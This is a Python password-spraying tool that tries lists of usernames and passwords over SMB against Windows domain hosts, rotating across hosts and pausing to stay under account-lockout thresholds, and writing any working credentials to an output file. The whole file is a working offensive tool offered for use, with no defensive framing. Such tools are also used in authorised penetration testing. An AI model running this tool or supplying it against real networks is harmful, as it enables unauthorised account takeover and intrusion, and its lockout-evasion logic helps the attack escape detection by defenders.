#!/usr/bin/env python3
#Round Robin Password Spraying
#ruby script and poc by Alton Johnson
#original python by Connor Brewer
#updated round robin, observation window, and threshold functions by joefizz
 
from smb.SMBConnection import *
import sys
import argparse
import time
from datetime import datetime

print('''                
                                                                           ,,                
 .M"""bgd                                                                `7MM                
,MI    "Y                                                                  MM                
`MMb.   `7MMpdMAo.`7Mb,od8 ,6"Yb.`7M'   `MF'     ,6"Yb.  `7MMpMMMb.   ,M""bMM                
  `YMMNq. MM   `Wb  MM' "'8)   MM  VA   ,V      8)   MM    MM    MM ,AP    MM                
.     `MM MM    M8  MM     ,pm9MM   VA ,V        ,pm9MM    MM    MM 8MI    MM                
Mb     dM MM   ,AP  MM    8M   MM    VVV        8M   MM    MM    MM `Mb    MM                
P"Ybmmd"  MMbmmd' .JMML.  `Moo9^Yo.  ,V         `Moo9^Yo..JMML  JMML.`Wbmd"MML.              
          MM                        ,V                                                       
        .JMML.                   OOb"                                                        
`7MMF'     A     `7MF'      `7MM  `7MM                db                                     
  `MA     ,MA     ,V          MM    MM               ;MM:                                    
   VM:   ,VVM:   ,V ,6"Yb.    MM    MM  ,MP'        ,V^MM.`7M'    ,A    `MF',6"Yb.`7M'   `MF'
    MM.  M' MM.  M'8)   MM    MM    MM ;Y          ,M  `MM  VA   ,VAA   ,V 8)   MM  VA   ,V  
    `MM A'  `MM A'  ,pm9MM    MM    MM;Mm          AbmmmqMA  VA ,V  VA ,V   ,pm9MM   VA ,V   
     :MM;    :MM;  8M   MM    MM    MM `Mb.       A'     VML  VVV    VVV   8M   MM    VVV    
      VF      VF   `Moo9^Yo..JMML..JMML. YA.    .AMA.   .AMMA. W      W    `Moo9^Yo.  ,V     
                                                                                     ,V      
                                                                                  OOb"       
''')

parser = argparse.ArgumentParser(description="Password spraying against a domain host")
user_group = parser.add_mutually_exclusive_group(required=True)
user_group.add_argument("-u", "--username", type=str, help="Single username for spraying")
user_group.add_argument("-U", "--userfile", type=str, help="List of usernames for spraying")

ip_group = parser.add_mutually_exclusive_group(required=True)
ip_group.add_argument("-i", "--ip", type=str, help="Single host for spraing against")
ip_group.add_argument("-I", "--ipfile", type=str, help="List of hosts to spray against in round robin fashion")

pass_group = parser.add_mutually_exclusive_group(required=True)
pass_group.add_argument("-p", "--password", type=str, help="Single password for spraying")
pass_group.add_argument("-P", "--passfile", type=str, help="File of password to use for spraying")

parser.add_argument("-d", "--domain", type=str, required=True)

parser.add_argument("-w", "--window", type=int, help="Observation window for password lockout (Default 30 minutes)", default=30)

parser.add_argument("-t", "--threshold", type=int, help="Account lockout threshold for failed attempts (Default = 3)", default=3)

parser.add_argument("-D", "--delay", type=int, help="Delay between each individual attempt in milliseconds (Dfault = 0)", default=0)

parser.add_argument("-o", "--out", type=str, help="Output file (Default ./out.txt)", default="./out.txt")
args = parser.parse_args()
 

def check_creds(dom, uname, pwd, c_name, ip, out) -> bool:

	conn = SMBConnection(uname, pwd, c_name, ip, domain=dom, use_ntlm_v2=True, is_direct_tcp=True)
 
	conn.connect(ip, 445, timeout=3)
	try:
		#if we're unauthed, this will throw and exception
		x = conn.listShares()
		print(f"[+]{dom}/{uname}:{pwd}")
		out_file = open(out, "a")
		out_file.write("\n[+] "+ip+"  -  "+uname+":"+pwd)
		out_file.flush()
		return True
	except:
		return False


def pwd_spray(usernames: list[str], passwords, ips, domain, window, threshold, out):
	log_file = open("spraylog", "a")
	ip_counter = 0
	pass_counter = 0
	#reverse usernames to iterate in reverse, to prevent skipping items when removing
	usernames.reverse()
	for password in passwords:
		now = datetime.now()
		log_file.write("\n * * * "+now.strftime("%H:%M:%S")+" Password: "+password)
		log_file.flush()
		print("Password: "+ password)
		#iterate users in reverse
		for user_index in range(len(usernames) - 1, -1 , -1):
			user = usernames[user_index]
			if (args.delay > 0):
				time.sleep(args.delay/1000)
			now = datetime.now()
			#if we've hit the end of our ip list, go to the beginning
			if (ip_counter > len(ips)):
				ip_counter = 0

			#check creds on  the ip address.
			#192.168.0.1 is a random string value that doesn't matter.
			connect_success = False
			while not connect_success:
				if (ip_counter >= len(ips)):
					ip_counter = 0
				try:
					if check_creds(domain, user, password, "192.168.0.1", ips[ip_counter], out):
						#the password worked, remove the user from the list to prevent trying more passwords
						del usernames[user_index]
					log_file.write("\n"+now.strftime("%H:%M:%S")+" "+str(ips[ip_counter])+" "+user)
					log_file.flush()
					connect_success = True
				except:
					print(f"Failed on {ips[ip_counter]}, removing from list")
					#something went wrong. try a different host
					del ips[ip_counter]
					if (len(ips) == 0):
						print("Ran out of SMB hosts")
						sys.exit()
					ip_counter +=1


			ip_counter += 1
		pass_counter +=1
		print("pass_counter: "+str(pass_counter))
		if (pass_counter >= threshold-1):
			window_seconds = window * 60
			print("Attempt threshold reached, pausing for "+str(window)+" minutes (continue with ctrl-c)")
			try:
				
				for remaining in range(window_seconds, 0, -1):
					sys.stdout.write("\r")
					sys.stdout.write("{:2d} seconds remaining.".format(remaining))
					sys.stdout.flush()
					time.sleep(1)
			except:
				pass_counter = 0
				now = datetime.now()
				dt_string = now.strftime("%H:%M:%S")
				sys.stdout.write("\r Forced Resume @ "+dt_string+"            \n")
				continue
			sys.stdout.write("\rResuming                                     \n")
			time.sleep(window * 60)
			pass_counter = 0


	return

if args.userfile is not None:
	with open(args.userfile) as unames:
		usernames = list(filter(None, unames.read().split("\n")))
else:
	usernames = [args.username]

if args.passfile is not None:
	with open(args.passfile) as pwords:
		passwords = list(filter(None, pwords.read().split("\n")))
else:
    passwords = [args.password]

if args.ipfile is not None:
	with open(args.ipfile) as ipaddrs:
		ipaddresses = list(filter(None, ipaddrs.read().split("\n")))
else:
    ipaddresses = [args.ip]

#print("usernames: ")
#print(usernames)
#print("passwords:")
#print(passwords)
#print("ip")
#print(ipaddresses)
now = datetime.now()
dt_string = now.strftime("%H:%M:%S")
print("\n Initiating pasword spray @ "+dt_string)
print("Domain: "+args.domain)
print("Window: "+str(args.window))
print("Threshold: "+str(args.threshold))
print("Out: "+args.out)

pwd_spray(usernames, passwords, ipaddresses, args.domain, args.window, args.threshold, args.out)
